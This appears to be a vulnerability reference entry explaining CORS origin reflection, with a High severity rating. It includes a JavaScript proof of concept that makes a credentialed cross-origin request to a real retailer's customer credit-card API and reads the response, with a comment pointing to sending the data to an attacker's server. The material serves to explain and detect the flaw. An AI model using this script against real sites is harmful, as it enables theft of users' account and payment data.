# Origin reflection

## Description

Short: Host allows any origin to make requests to it.

Detailed: Blindly reflect the Origin header value in `Access-Control-Allow-Origin headers` in responses, which means any website can read its secrets by sending cross-orign requests.

**Severity**: High

## Exploit 
Make requests from any domain you control.

### Example 
```javascript
<script>
    // Send a cross origin request to the walmart.com server, when a victim visits the page.
    var req = new XMLHttpRequest();
    req.open('GET',"https://www.walmart.com/account/electrode/account/api/customer/:CID/credit-card",true);
    req.onload = stealData;
    req.withCredentials = true;
    req.send();

    function stealData(){
        //reading response is allowed because of the CORS misconfiguration.
        var data= JSON.stringify(JSON.parse(this.responseText),null,2);

        //display the data on the page. A real attacker can send the data to his server.
        output(data);
    }

    function output(inp) {
        document.body.appendChild(document.createElement('pre')).innerHTML = inp;
    }
</script>
```

[code source](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration#vulnerable-example-null-origin)
